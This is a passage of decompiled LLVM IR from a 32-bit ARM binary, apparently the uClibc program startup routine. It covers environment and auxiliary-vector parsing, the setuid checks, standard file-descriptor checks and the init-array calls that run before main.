  %v1_14fac = add i32 %tmp, 4
  store i32 %v1_14fac, i32* %ip.global-to-local, align 4
  %v2_14fb0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r4.global-to-local, align 4
  %v3_14fbc = mul i32 %arg2, 4
  store i32 %v3_14fbc, i32* @r7, align 4
  %v4_14fc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 24) to i32*), align 4
  store i32 %v4_14fc4, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_14fcc = add i32 %v1_14fac, %v3_14fbc
  store i32 %v2_14fcc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %stack_var_-416, align 4
  %v4_14fd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 56) to i32*), align 4
  store i32 %v4_14fd4, i32* %r4.global-to-local, align 4
  %v3_14fd8 = icmp uge i32 %v2_14fcc, %v2_14fb0
  store i1 %v3_14fd8, i1* %cpsr_c.global-to-local, align 1
  %v9_14fd8 = icmp eq i32 %v2_14fcc, %v2_14fb0
  store i1 %v9_14fd8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_14fe0 = inttoptr i32 %v4_14fd4 to i32*
  store i32 %v2_14fcc, i32* %v2_14fe0, align 4
  br i1 %v9_14fd8, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_14fe8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fe8 = load i32, i32* %r1.global-to-local, align 4
  %v2_14fe8 = inttoptr i32 %v1_14fe8 to i32*
  store i32 %v0_14fe8, i32* %v2_14fe8, align 4
  %v2_14fec = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14fec, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2008, i32* %r2.global-to-local, align 4
  %v0_14ff8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14ff8, i32* @r6, align 4
  br i1 %v9_14fd8, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_1500053 = add i32 %v2_14fec, 2008
  %v4_1500054 = inttoptr i32 %v3_1500053 to i32*
  store i32 %arg6, i32* %v4_1500054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_14ffc = load i32, i32* %ip.global-to-local, align 4
  %v2_14ffc = load i32, i32* @r7, align 4
  %v3_14ffc = add i32 %v2_14ffc, %v1_14ffc
  store i32 %v3_14ffc, i32* %r3.global-to-local, align 4
  %v3_1500050 = add i32 %v2_14fec, 2008
  %v4_1500051 = inttoptr i32 %v3_1500050 to i32*
  store i32 %arg6, i32* %v4_1500051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1500c = load i32, i32* %r3.global-to-local, align 4
  %v2_1500c = load i32, i32* %r4.global-to-local, align 4
  %v3_1500c = inttoptr i32 %v2_1500c to i32*
  store i32 %v1_1500c, i32* %v3_1500c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_15010 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_15010, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_15018 = bitcast i32* %stack_var_-120 to i8*
  %v4_15018 = call i32 @__GI_memset(i8* %v3_15018, i32 0, i32 120)
  store i32 %v4_15018, i32* %r0.global-to-local, align 4
  %v0_1501c = load i32, i32* %r4.global-to-local, align 4
  %v1_1501c = inttoptr i32 %v0_1501c to i32*
  %v2_1501c = load i32, i32* %v1_1501c, align 4
  br label %dec_label_pc_15028

dec_label_pc_15028:                               ; preds = %dec_label_pc_15028, %bb77
  %storemerge = phi i32 [ %v2_1501c, %bb77 ], [ %v1_15034, %dec_label_pc_15028 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_15028 = inttoptr i32 %storemerge to i32*
  %v2_15028 = load i32, i32* %v1_15028, align 4
  store i32 %v2_15028, i32* %r3.global-to-local, align 4
  %v2_1502c = icmp eq i32 %v2_15028, 0
  %v1_15034 = add i32 %storemerge, 4
  br i1 %v2_1502c, label %dec_label_pc_15034, label %dec_label_pc_15028

dec_label_pc_15034:                               ; preds = %dec_label_pc_15028
  store i32 %v1_15034, i32* @r4, align 4
  store i32 %v2_15010, i32* @r5, align 4
  %v1_1505830 = inttoptr i32 %v1_15034 to i32*
  %v2_1505831 = load i32, i32* %v1_1505830, align 4
  store i32 %v2_1505831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1505c33 = icmp eq i32 %v2_1505831, 0
  store i1 %v2_1505c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1505c33, label %dec_label_pc_15064, label %dec_label_pc_15040

dec_label_pc_15040:                               ; preds = %dec_label_pc_15034, %dec_label_pc_15058
  %v4_15048 = phi i32 [ %v1_15054, %dec_label_pc_15058 ], [ %v1_15034, %dec_label_pc_15034 ]
  %v5_15044 = phi i32 [ %v2_15058, %dec_label_pc_15058 ], [ %v2_1505831, %dec_label_pc_15034 ]
  %v2_15040 = icmp ugt i32 %v5_15044, 13
  store i1 %v2_15040, i1* %cpsr_c.global-to-local, align 1
  %v7_15040 = icmp eq i32 %v5_15044, 14
  store i1 %v7_15040, i1* %cpsr_z.global-to-local, align 1
  %v2_15044 = xor i1 %v2_15040, true
  %v3_15044 = or i1 %v7_15040, %v2_15044
  br i1 %v3_15044, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_15040
  %v4_15044 = load i32, i32* @r5, align 4
  %v6_15044 = and i32 %v5_15044, 536870912
  %v7_15044 = icmp ne i32 %v6_15044, 0
  store i1 %v7_15044, i1* %cpsr_c.global-to-local, align 1
  %v8_15044 = mul i32 %v5_15044, 8
  %v9_15044 = add i32 %v4_15044, %v8_15044
  store i32 %v9_15044, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_15040, %bb78
  %v1_15050 = phi i1 [ %v2_15040, %dec_label_pc_15040 ], [ %v7_15044, %bb78 ]
  %v2_15048 = xor i1 %v1_15050, true
  %v3_15048 = or i1 %v7_15040, %v2_15048
  br i1 %v3_15048, label %bb80, label %dec_label_pc_15058

bb80:                                             ; preds = %bb79
  store i32 %v4_15048, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15058

dec_label_pc_15058:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_15048, i32 ptrtoint (i32* @global_var_11c10.568 to i32))
  %v0_15054 = load i32, i32* @r4, align 4
  %v1_15054 = add i32 %v0_15054, 8
  store i32 %v1_15054, i32* @r4, align 4
  %v1_15058 = inttoptr i32 %v1_15054 to i32*
  %v2_15058 = load i32, i32* %v1_15058, align 4
  store i32 %v2_15058, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1505c = icmp eq i32 %v2_15058, 0
  store i1 %v2_1505c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1505c, label %dec_label_pc_15064, label %dec_label_pc_15040

dec_label_pc_15064:                               ; preds = %dec_label_pc_15058, %dec_label_pc_15034
  store i32 %v2_15010, i32* %r0.global-to-local, align 4
  %v1_15068 = call i32 @_dl_aux_init(i32 %v2_15010)
  store i32 %v1_15068, i32* %r0.global-to-local, align 4
  %v1_1506c = call i32 @__GI___uClibc_init(i32 %v1_15068)
  store i32 %v1_1506c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_15074 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15074, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1507c = add i32 %v2_15074, 148
  %v3_1507c = inttoptr i32 %v2_1507c to i32*
  %v4_1507c = load i32, i32* %v3_1507c, align 4
  store i32 %v4_1507c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15084 = icmp eq i32 %tmp66, 0
  store i1 %v2_15084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15084, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_15064
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_15064, %bb81
  %v0_15090 = phi i32 [ %tmp66, %dec_label_pc_15064 ], [ 4096, %bb81 ]
  %v3_1508c = icmp eq i32 %tmp65, -1
  store i1 %v3_1508c, i1* %cpsr_c.global-to-local, align 1
  %v8_1508c = icmp eq i32 %tmp65, -1
  store i1 %v8_1508c, i1* %cpsr_z.global-to-local, align 1
  %v2_15090 = inttoptr i32 %v4_1507c to i32*
  store i32 %v0_15090, i32* %v2_15090, align 4
  br i1 %v3_1508c, label %dec_label_pc_15098, label %dec_label_pc_150c0

dec_label_pc_15098:                               ; preds = %bb82
  %v0_15098 = call i32 @getuid()
  store i32 %v0_15098, i32* @r0, align 4
  store i32 %v0_15098, i32* %r4.global-to-local, align 4
  %v0_150a0 = call i32 @geteuid()
  store i32 %v0_150a0, i32* @r0, align 4
  %v3_150a4 = icmp uge i32 %v0_15098, %v0_150a0
  store i1 %v3_150a4, i1* %cpsr_c.global-to-local, align 1
  %v9_150a4 = icmp eq i32 %v0_15098, %v0_150a0
  store i1 %v9_150a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_150a4, label %dec_label_pc_150ac, label %dec_label_pc_150e8

dec_label_pc_150ac:                               ; preds = %dec_label_pc_15098
  %v1_150ac = call i32 @getgid(i32 %v0_150a0)
  store i32 %v1_150ac, i32* @r0, align 4
  store i32 %v1_150ac, i32* %r4.global-to-local, align 4
  %v0_150b4 = call i32 @getegid()
  store i32 %v0_150b4, i32* %r0.global-to-local, align 4
  %v3_150b8 = icmp uge i32 %v1_150ac, %v0_150b4
  store i1 %v3_150b8, i1* %cpsr_c.global-to-local, align 1
  %v9_150b8 = icmp eq i32 %v1_150ac, %v0_150b4
  store i1 %v9_150b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_150b8, label %dec_label_pc_150c0, label %dec_label_pc_150e8

dec_label_pc_150c0:                               ; preds = %dec_label_pc_150ac, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1508c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1508c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1508c, label %dec_label_pc_15110, label %dec_label_pc_150cc

dec_label_pc_150cc:                               ; preds = %dec_label_pc_150c0
  store i32 %tmp64, i32* @r3, align 4
  %v3_150d0 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_150d0, i1* %cpsr_c.global-to-local, align 1
  %v9_150d0 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_150d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_150d0, label %dec_label_pc_150d8, label %dec_label_pc_150e8

dec_label_pc_150d8:                               ; preds = %dec_label_pc_150cc
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_150e0 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_150e0, i1* %cpsr_c.global-to-local, align 1
  %v9_150e0 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_150e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_150e0, label %dec_label_pc_15110, label %dec_label_pc_150e8

dec_label_pc_150e8:                               ; preds = %dec_label_pc_150cc, %dec_label_pc_150ac, %dec_label_pc_15098, %dec_label_pc_150d8
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_150f4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_150fc = load i32, i32* @r4, align 4
  store i32 %v0_150fc, i32* %r1.global-to-local, align 4
  %v2_15100 = call i32 @__check_one_fd(i32 1, i32 %v0_150fc)
  %v0_15104 = load i32, i32* @r4, align 4
  store i32 %v0_15104, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1510c = call i32 @__check_one_fd(i32 2, i32 %v0_15104)
  store i32 %v2_1510c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15110

dec_label_pc_15110:                               ; preds = %dec_label_pc_150d8, %dec_label_pc_150c0, %dec_label_pc_150e8
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_15118 = load i32, i32* %arg3, align 4
  store i32 %v2_15118, i32* %r2.global-to-local, align 4
  %v2_1511c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1511c, i32* %r1.global-to-local, align 4
  %v3_15120 = add i32 %v2_1511c, 260
  %v4_15120 = inttoptr i32 %v3_15120 to i32*
  store i32 %v2_15118, i32* %v4_15120, align 4
  %v0_15124 = load i32, i32* %r0.global-to-local, align 4
  %v1_15124 = inttoptr i32 %v0_15124 to i32*
  %v2_15124 = load i32, i32* %v1_15124, align 4
  store i32 %v2_15124, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15128 = icmp eq i32 %v2_15124, 0
  store i1 %v2_15128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15128, label %bb84, label %dec_label_pc_15130

dec_label_pc_15130:                               ; preds = %dec_label_pc_15110
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_15134 = load i32, i32* %r1.global-to-local, align 4
  %v2_15134 = add i32 %v0_15134, 164
  %v3_15134 = inttoptr i32 %v2_15134 to i32*
  %v4_15134 = load i32, i32* %v3_15134, align 4
  store i32 %v4_15134, i32* %r3.global-to-local, align 4
  %v2_15138 = inttoptr i32 %v4_15134 to i32*
  store i32 %v2_15124, i32* %v2_15138, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_15140 = load i32, i32* %r0.global-to-local, align 4
  %v1_15140 = inttoptr i32 %v0_15140 to i32*
  %v2_15140 = load i32, i32* %v1_15140, align 4
  store i32 %v2_15140, i32* %r0.global-to-local, align 4
  %v4_15144 = call i32 @__GI_strrchr(i32 %v2_15140, i32 47, i32 %v2_15118, i32 %v4_15134)
  store i32 %v4_15144, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_1514c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1514c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15150 = icmp eq i32 %v4_15144, 0
  store i1 %v2_15150, i1* %cpsr_z.global-to-local, align 1
  %v2_15154 = add i32 %v2_1514c, 96
  %v3_15154 = inttoptr i32 %v2_15154 to i32*
  %v4_15154 = load i32, i32* %v3_15154, align 4
  store i32 %v4_15154, i32* %r2.global-to-local, align 4
  br i1 %v2_15150, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_15130
  %v2_1515c58 = inttoptr i32 %v4_15154 to i32*
  store i32 0, i32* %v2_1515c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_15130
  %v2_15158 = add i32 %v4_15144, 1
  store i32 %v2_15158, i32* %r3.global-to-local, align 4
  %v2_1515c = inttoptr i32 %v4_15154 to i32*
  store i32 %v4_15144, i32* %v2_1515c, align 4
  %v1_15160 = load i32, i32* %r3.global-to-local, align 4
  %v2_15160 = load i32, i32* %r2.global-to-local, align 4
  %v3_15160 = inttoptr i32 %v2_15160 to i32*
  store i32 %v1_15160, i32* %v3_15160, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_15110
  %v2_15170 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15170, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1517c = add i32 %v2_15170, -12
  store i32 %v2_1517c, i32* %r5.global-to-local, align 4
  store i32 2004, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1518c = add i32 %v2_15170, 2004
  %v4_1518c = inttoptr i32 %v3_1518c to i32*
  store i32 %arg5, i32* %v4_1518c, align 4
  %v0_151a418 = load i32, i32* %r4.global-to-local, align 4
  %v1_151a419 = load i32, i32* %r7.global-to-local, align 4
  %v3_151a421 = icmp uge i32 %v0_151a418, %v1_151a419
  store i1 %v3_151a421, i1* %cpsr_c.global-to-local, align 1
  %v9_151a427 = icmp eq i32 %v0_151a418, %v1_151a419
  store i1 %v9_151a427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_151a421, label %dec_label_pc_151d8.lr.ph, label %dec_label_pc_15194

dec_label_pc_15194:                               ; preds = %bb84, %dec_label_pc_15194
  %v1_15194 = phi i32 [ %v1_151a0, %dec_label_pc_15194 ], [ %v0_151a418, %bb84 ]
  %v0_15194 = load i32, i32* %r5.global-to-local, align 4
  %v2_15194 = and i32 %v1_15194, 1073741824
  %v3_15194 = icmp ne i32 %v2_15194, 0
  store i1 %v3_15194, i1* %cpsr_c.global-to-local, align 1
  %v4_15194 = mul i32 %v1_15194, 4
  %v5_15194 = add i32 %v4_15194, %v0_15194
  %v6_15194 = inttoptr i32 %v5_15194 to i32*
  %v7_15194 = load i32, i32* %v6_15194, align 4
  store i32 %v7_15194, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_15194)
  %v0_151a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_151a0 = add i32 %v0_151a0, 1
  store i32 %v1_151a0, i32* %r4.global-to-local, align 4
  %v1_151a4 = load i32, i32* %r7.global-to-local, align 4
  %v3_151a4 = icmp uge i32 %v1_151a0, %v1_151a4
  store i1 %v3_151a4, i1* %cpsr_c.global-to-local, align 1
  %v9_151a4 = icmp eq i32 %v1_151a0, %v1_151a4
  store i1 %v9_151a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_151a4, label %dec_label_pc_151d8.lr.ph, label %dec_label_pc_15194

dec_label_pc_151d8.lr.ph:                         ; preds = %dec_label_pc_15194, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_151ac = icmp eq i32 %v0_14ff8, 0
  store i1 %v2_151ac, i1* %cpsr_z.global-to-local, align 1
  %v2_151b4 = xor i1 %v2_151ac, true
  call void @__pseudo_cond_branch(i1 %v2_151b4, i32 %v0_14ff8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_151c0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_151cc = add i32 %v2_151c0, -12
  store i32 %v2_151cc, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_151d8

dec_label_pc_151d8:                               ; preds = %dec_label_pc_151d8.dec_label_pc_151d8_crit_edge, %dec_label_pc_151d8.lr.ph
  %v1_151d8 = phi i32 [ %v1_151e4, %dec_label_pc_151d8.dec_label_pc_151d8_crit_edge ], [ 0, %dec_label_pc_151d8.lr.ph ]
  %v0_151d8 = phi i32 [ %v0_151d8.pre, %dec_label_pc_151d8.dec_label_pc_151d8_crit_edge ], [ %v2_151cc, %dec_label_pc_151d8.lr.ph ]
  %v2_151d8 = and i32 %v1_151d8, 1073741824
  %v3_151d8 = icmp ne i32 %v2_151d8, 0
  store i1 %v3_151d8, i1* %cpsr_c.global-to-local, align 1
  %v4_151d8 = mul i32 %v1_151d8, 4
  %v5_151d8 = add i32 %v4_151d8, %v0_151d8
  %v6_151d8 = inttoptr i32 %v5_151d8 to i32*
  %v7_151d8 = load i32, i32* %v6_151d8, align 4
  store i32 %v7_151d8, i32* %ip.global-to-local, align 4
  store i32 86500, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_151d8)
  %v0_151e4 = load i32, i32* @r4, align 4
  %v1_151e4 = add i32 %v0_151e4, 1
  store i32 %v1_151e4, i32* @r4, align 4
  %v1_151e8 = load i32, i32* @r7, align 4
  %v3_151e8 = icmp uge i32 %v1_151e4, %v1_151e8
  store i1 %v3_151e8, i1* %cpsr_c.global-to-local, align 1
  %v9_151e8 = icmp eq i32 %v1_151e4, %v1_151e8
  store i1 %v9_151e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_151e8, label %dec_label_pc_151f0, label %dec_label_pc_151d8.dec_label_pc_151d8_crit_edge

dec_label_pc_151d8.dec_label_pc_151d8_crit_edge:  ; preds = %dec_label_pc_151d8
  %v0_151d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_151d8

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151d8
  %v2_151f4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_151f4.pre, i32* %r0.global-to-local, align 4
  %v2_151f8 = add i32 %v2_151f4.pre, -67200
  store i32 %v2_151f8, i32* %r2.global-to-local, align 4
  store i32 %v2_151f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15200 = icmp eq i32 %v2_151f8, 0
  store i1 %v2_15200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15200, label %dec_label_pc_15218, label %dec_label_pc_15208

dec_label_pc_15208:                               ; preds = %dec_label_pc_151f0
  store i32 86544, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_151f8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15214 = load i32, i32* %r0.global-to-local, align 4
  %v2_15214 = inttoptr i32 %v1_15214 to i32*
  store i32 0, i32* %v2_15214, align 4
  %v2_1521c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_15218

dec_label_pc_15218:                               ; preds = %dec_label_pc_151f0, %dec_label_pc_15208
  %v2_1521c = phi i32 [ %v2_151f4.pre, %dec_label_pc_151f0 ], [ %v2_1521c.pre, %dec_label_pc_15208 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_1521c, i32* %r1.global-to-local, align 4
  %v2_15220 = add i32 %v2_1521c, 128
  %v3_15220 = inttoptr i32 %v2_15220 to i32*
  %v4_15220 = load i32, i32* %v3_15220, align 4
  store i32 %v4_15220, i32* %r2.global-to-local, align 4
  store i32 %v4_15220, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15228 = icmp eq i32 %v4_15220, 0
  store i1 %v2_15228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15228, label %dec_label_pc_15240, label %dec_label_pc_15230

dec_label_pc_15230:                               ; preds = %dec_label_pc_15218
  store i32 86584, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15220)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1523c = load i32, i32* %r0.global-to-local, align 4
  %v2_1523c = inttoptr i32 %v1_1523c to i32*
  store i32 0, i32* %v2_1523c, align 4
  br label %dec_label_pc_15240

dec_label_pc_15240:                               ; preds = %dec_label_pc_15218, %dec_label_pc_15230
  %v2_15240 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_15240, i32* @r0, align 4
  %v1_15244 = call i32 @_setjmp(i32 %v2_15240)
  store i32 %v1_15244, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15248 = icmp eq i32 %v1_15244, 0
  store i1 %v2_15248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15248, label %dec_label_pc_15250, label %dec_label_pc_1529c

dec_label_pc_15250:                               ; preds = %dec_label_pc_15240
  %v0_15250 = call i32 @__aeabi_read_tp()
  store i32 %v0_15250, i32* %r0.global-to-local, align 4
  %v1_15254 = add i32 %v0_15250, -1168
  store i32 %v1_15254, i32* %r2.global-to-local, align 4
  %v2_1525c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1525c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_15268 = add i32 %v2_1525c, 56
  %v3_15268 = inttoptr i32 %v2_15268 to i32*
  %v4_15268 = load i32, i32* %v3_15268, align 4
  store i32 %v4_15268, i32* %ip.global-to-local, align 4
  store i32 %v2_15240, i32* %r3.global-to-local, align 4
  %v2_15278 = add i32 %v0_15250, -1040
  %v3_15278 = inttoptr i32 %v2_15278 to i32*
  store i32 %v2_15240, i32* %v3_15278, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_15284 = load i32, i32* %ip.global-to-local, align 4
  %v1_15284 = inttoptr i32 %v0_15284 to i32*
  %v2_15284 = load i32, i32* %v1_15284, align 4
  store i32 %v2_15284, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_15294 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15338

dec_label_pc_1529c:                               ; preds = %dec_label_pc_15240
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_152a0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_152a0, i32* %ip.global-to-local, align 4
  %v2_152a4 = add i32 %v2_152a0, 40
  %v3_152a4 = inttoptr i32 %v2_152a4 to i32*
  %v4_152a4 = load i32, i32* %v3_152a4, align 4
  store i32 %v4_152a4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_152a4)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_152b4 = load i32, i32* %stack_var_-416, align 4
  %v2_152b8 = add i32 %v2_152b4, 120
  %v3_152b8 = inttoptr i32 %v2_152b8 to i32*
  %v4_152b8 = load i32, i32* %v3_152b8, align 4
  store i32 %v4_152b8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_152bc

dec_label_pc_152bc:                               ; preds = %dec_label_pc_152f0.dec_label_pc_152bc_crit_edge, %dec_label_pc_1529c
  %v0_152bc = phi i32 [ %v0_152bc.pre, %dec_label_pc_152f0.dec_label_pc_152bc_crit_edge ], [ %v4_152b8, %dec_label_pc_1529c ]
  %v1_152bc = inttoptr i32 %v0_152bc to i32*
  %v2_152bc = load i32, i32* %v1_152bc, align 4
  store i32 %v0_152bc, i32* %r2.global-to-local, align 4
  store i32 %v2_152bc, i32* %r4.global-to-local, align 4
  %v1_152c8 = add i32 %v2_152bc, -1
  store i32 %v1_152c8, i32* %r1.global-to-local, align 4
  %v2_152cc89 = load i32, i32* %v1_152bc, align 4
  store i32 %v2_152cc89, i32* %r3.global-to-local, align 4
  %v3_152d091 = icmp uge i32 %v2_152cc89, %v2_152bc
  store i1 %v3_152d091, i1* %cpsr_c.global-to-local, align 1
  %v9_152d097 = icmp eq i32 %v2_152cc89, %v2_152bc
  store i1 %v9_152d097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_152d097, label %dec_label_pc_152d8, label %dec_label_pc_152f0

dec_label_pc_152d8:                               ; preds = %dec_label_pc_152bc, %dec_label_pc_152d8.dec_label_pc_152cc_crit_edge
  %v0_152d898 = phi i32 [ %v1_152d0.pre, %dec_label_pc_152d8.dec_label_pc_152cc_crit_edge ], [ %v2_152bc, %dec_label_pc_152bc ]
  store i32 %v0_152d898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_152e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_152e8, label %dec_label_pc_152ec, label %dec_label_pc_152d8.dec_label_pc_152cc_crit_edge

dec_label_pc_152d8.dec_label_pc_152cc_crit_edge:  ; preds = %dec_label_pc_152d8
  %v0_152cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_152d0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_152cc = inttoptr i32 %v0_152cc.pre to i32*
  %v2_152cc = load i32, i32* %v1_152cc, align 4
  store i32 %v2_152cc, i32* %r3.global-to-local, align 4
  %v3_152d0 = icmp uge i32 %v2_152cc, %v1_152d0.pre
  store i1 %v3_152d0, i1* %cpsr_c.global-to-local, align 1
  %v9_152d0 = icmp eq i32 %v2_152cc, %v1_152d0.pre
  store i1 %v9_152d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_152d0, label %dec_label_pc_152d8, label %dec_label_pc_152f0

dec_label_pc_152ec:                               ; preds = %dec_label_pc_152d8
  %v0_152ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_152ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_152f0

dec_label_pc_152f0:                               ; preds = %dec_label_pc_152bc, %dec_label_pc_152d8.dec_label_pc_152cc_crit_edge, %dec_label_pc_152ec
  %v0_152f8 = phi i32 [ %v0_152ec, %dec_label_pc_152ec ], [ %v2_152cc89, %dec_label_pc_152bc ], [ %v2_152cc, %dec_label_pc_152d8.dec_label_pc_152cc_crit_edge ]
  %v1_152f0 = phi i32 [ %v0_152ec, %dec_label_pc_152ec ], [ %v2_152bc, %dec_label_pc_152bc ], [ %v1_152d0.pre, %dec_label_pc_152d8.dec_label_pc_152cc_crit_edge ]
  %v3_152f0 = icmp uge i32 %v0_152f8, %v1_152f0
  store i1 %v3_152f0, i1* %cpsr_c.global-to-local, align 1
  %v9_152f0 = icmp eq i32 %v0_152f8, %v1_152f0
